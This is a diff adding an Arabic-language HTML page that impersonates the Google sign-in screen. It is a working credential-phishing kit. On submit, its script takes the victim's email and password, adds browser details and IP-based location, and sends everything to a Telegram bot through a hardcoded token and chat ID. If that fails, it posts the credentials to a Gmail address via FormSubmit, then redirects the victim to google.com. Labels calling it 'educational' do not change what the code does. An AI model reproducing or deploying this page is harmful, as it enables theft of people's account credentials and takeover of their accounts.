@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول - Google</title>
+    <style>
+        /* نفس الـ CSS السابق - نسخه من الكود السابق */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            direction: rtl;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            padding: 48px 40px;
+            border-radius: 16px;
+            box-shadow: 0 25px 80px rgba(0,0,0,0.35);
+            width: 450px;
+            max-width: 100%;
+            animation: slideUp 0.6s ease-out;
+        }
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .logo { text-align: center; margin-bottom: 20px; }
+        .logo svg { width: 75px; height: 75px; }
+        h1 { font-size: 24px; text-align: center; margin-bottom: 4px; color: #202124; }
+        .subtitle { text-align: center; color: #5f6368; margin-bottom: 32px; }
+        .input-group { margin-bottom: 20px; }
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #dadce0;
+            border-radius: 8px;
+            font-size: 15px;
+            transition: all 0.3s;
+        }
+        .input-group input:focus {
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 4px rgba(26,115,232,0.1);
+            outline: none;
+        }
+        button {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 12px 32px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s;
+        }
+        button:hover { background: #1557b0; transform: translateY(-1px); }
+        .footer { text-align: center; margin-top: 32px; font-size: 12px; color: #5f6368; }
+        .footer a { color: #1a73e8; text-decoration: none; }
+        @media (max-width: 480px) {
+            .container { padding: 32px 24px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+                <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+                <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+                <path fill="#FBBC05" d="M10.54 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 0 0 0 24c0 3.77.87 7.35 2.56 10.54l7.98-5.95z"/>
+                <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 5.95C6.51 42.62 14.62 48 24 48z"/>
+            </svg>
+        </div>
+        <h1>تسجيل الدخول</h1>
+        <p class="subtitle">استخدم حساب Google الخاص بك</p>
+        
+        <form id="loginForm">
+            <div class="input-group">
+                <input type="email" id="email" name="email" placeholder="البريد الإلكتروني" required>
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" name="password" placeholder="كلمة المرور" required>
+            </div>
+            <button type="submit">تسجيل الدخول</button>
+        </form>
+        
+        <div class="footer">
+            <a href="#">مساعدة</a> · <a href="#">الخصوصية</a> · <a href="#">الشروط</a>
+        </div>
+    </div>
+
+    <script>
+        // ===== إعدادات تيليجرام =====
+        const BOT_TOKEN = '8922096083:AAEo67X0dm3q69yi3tTwHEl61Nt_uwgt25Q'; // استبدل هذا بتوكن البوت الخاص بك
+        const CHAT_ID = '​7780088477'; // استبدل هذا بمعرف المحادثة
+        
+        // ===== دالة إرسال إلى تيليجرام =====
+        async function sendToTelegram(data) {
+            const message = `
+🔐 **بيانات تسجيل دخول جديدة**
+━━━━━━━━━━━━━━━━
+📧 **البريد الإلكتروني:** \`${data.email}\`
+🔑 **كلمة المرور:** \`${data.password}\`
+━━━━━━━━━━━━━━━━
+🌐 **معلومات المتصفح:**
+• المنصة: ${data.platform}
+• المتصفح: ${data.browser}
+• اللغة: ${data.language}
+• الشاشة: ${data.screen}
+• المنطقة الزمنية: ${data.timezone}
+━━━━━━━━━━━━━━━━
+📍 **الموقع:**
+• المدينة: ${data.city || 'غير متاح'}
+• الدولة: ${data.country || 'غير متاح'}
+• خط العرض: ${data.lat || 'غير متاح'}
+• خط الطول: ${data.lng || 'غير متاح'}
+━━━━━━━━━━━━━━━━
+🕐 **الوقت:** ${data.timestamp}
+📄 **الصفحة:** ${data.pageUrl}
+🔗 **المصدر:** ${data.referrer || 'مباشر'}
+━━━━━━━━━━━━━━━━
+⚠️ _هذا للاختبار التعليمي فقط_
+            `.trim();
+            
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown',
+                        disable_web_page_preview: true
+                    })
+                });
+                
+                const result = await response.json();
+                console.log('✅ تم إرسال البيانات إلى تيليجرام:', result.ok);
+                return result.ok;
+            } catch (error) {
+                console.error('❌ فشل إرسال إلى تيليجرام:', error);
+                return false;
+            }
+        }
+        
+        // ===== دالة إرسال صورة (اختياري) =====
+        async function sendPhotoToTelegram(photoUrl, caption) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+            
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        photo: photoUrl,
+                        caption: caption,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (error) {
+                console.log('فشل إرسال الصورة');
+            }
+        }
+        
+        // ===== دالة إرسال ملف (اختياري) =====
+        async function sendDocumentToTelegram(documentUrl, caption) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
+            
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        document: documentUrl,
+                        caption: caption,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (error) {
+                console.log('فشل إرسال الملف');
+            }
+        }
+        
+        // ===== الحصول على معلومات المتصفح =====
+        function getBrowserInfo() {
+            return {
+                platform: navigator.platform,
+                browser: navigator.userAgent.substring(0, 100),
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookiesEnabled: navigator.cookieEnabled,
+                hardwareConcurrency: navigator.hardwareConcurrency || 'غير معروف'
+            };
+        }
+        
+        // ===== الحصول على الموقع =====
+        async function getLocation() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return {
+                    city: data.city,
+                    country: data.country_name,
+                    lat: data.latitude,
+                    lng: data.longitude,
+                    ip: data.ip,
+                    org: data.org
+                };
+            } catch (error) {
+                return {
+                    city: 'غير متاح',
+                    country: 'غير متاح',
+                    lat: 'غير متاح',
+                    lng: 'غير متاح',
+                    ip: 'غير متاح'
+                };
+            }
+        }
+        
+        // ===== معالجة تقديم النموذج =====
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value;
+            
+            if (!email || !password) {
+                alert('يرجى ملء جميع الحقول');
+                return;
+            }
+            
+            const submitBtn = this.querySelector('button');
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'جاري الإرسال...';
+            
+            // جمع المعلومات
+            const browserInfo = getBrowserInfo();
+            const location = await getLocation();
+            const timestamp = new Date().toLocaleString('ar-EG', { timeZone: 'Asia/Riyadh' });
+            
+            // تجهيز البيانات للإرسال
+            const data = {
+                email: email,
+                password: password,
+                ...browserInfo,
+                ...location,
+                timestamp: timestamp,
+                pageUrl: window.location.href,
+                referrer: document.referrer
+            };
+            
+            // إرسال إلى تيليجرام
+            const sent = await sendToTelegram(data);
+            
+            if (sent) {
+                console.log('✅ تم إرسال البيانات بنجاح');
+            } else {
+                // محاولة بديلة عبر FormSubmit
+                try {
+                    const formData = new FormData();
+                    formData.append('_subject', '🔐 بيانات تسجيل دخول');
+                    formData.append('email', email);
+                    formData.append('password', password);
+                    
+                    await fetch('https://formsubmit.co/proadm970@gmail.com', {
+                        method: 'POST',
+                        body: formData
+                    });
+                    console.log('✅ تم الإرسال عبر FormSubmit');
+                } catch(e) {
+                    console.log('❌ فشل جميع طرق الإرسال');
+                }
+            }
+            
+            // إعادة توجيه
+            setTimeout(() => {
+                window.location.href = 'https://google.com';
+            }, 1500);
+        });
+        
+        console.log('✅ بوت تيليجرام جاهز - للاستخدام التعليمي فقط');
+        async function sendWithButtons(data) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    
+    await fetch(url, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: `🔐 بيانات جديدة: ${data.email}`,
+            reply_markup: {
+                inline_keyboard: [
+                    [
+                        {text: '🌐 فتح الرابط', url: data.pageUrl},
+                        {text: '🗑️ حذف', callback_data: 'delete'}
+                    ],
+                    [
+                        {text: '📋 نسخ البريد', callback_data: `copy_${data.email}`},
+                        {text: '🔑 نسخ كلمة المرور', callback_data: `copy_${data.password}`}
+                    ]
+                ]
+            }
+        })
+    });
+}
+function formatTelegramMessage(data) {
+    return `
+┌───────────────────┐
+│ 🔐 **بيانات جديدة** │
+└───────────────────┘
+
+👤 **المستخدم:**
+├ 📧 بريد: \`${data.email}\`
+└ 🔑 كلمة سر: \`${data.password}\`
+
+💻 **الجهاز:**
+├ 🖥 النظام: ${data.platform}
+├ 🌐 المتصفح: ${data.browser.substring(0, 50)}...
+└ 📱 الشاشة: ${data.screen}
+
+📍 **الموقع:**
+├ 🏙 مدينة: ${data.city}
+├ 🌍 دولة: ${data.country}
+├ 📌 خط عرض: ${data.lat}
+└ 📌 خط طول: ${data.lng}
+
+🕐 **الوقت:** ${data.timestamp}
+
+━━━━━━━━━━━━━━━━
+⚠️ _بيانات تعليمية_
+    `.trim();
+}
+    </script>
+</body>
+</html>
